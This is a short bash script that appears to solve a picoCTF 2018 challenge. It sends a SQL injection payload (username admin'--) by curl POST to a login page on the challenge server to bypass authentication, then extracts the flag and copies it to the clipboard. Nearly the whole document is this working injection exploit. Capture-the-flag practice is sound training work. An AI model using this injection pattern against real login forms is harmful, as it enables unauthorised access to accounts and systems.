#!/usr/bin/bash

# Simiply using curl to POST data to the login, then greping for picoCTF and xcliping to clipboard
curl -s -X POST -F "username=admin'--" http://2018shell.picoctf.com:22430/login.php | tail -1 | grep -oE picoCTF{.*} | xclip -selection clipboard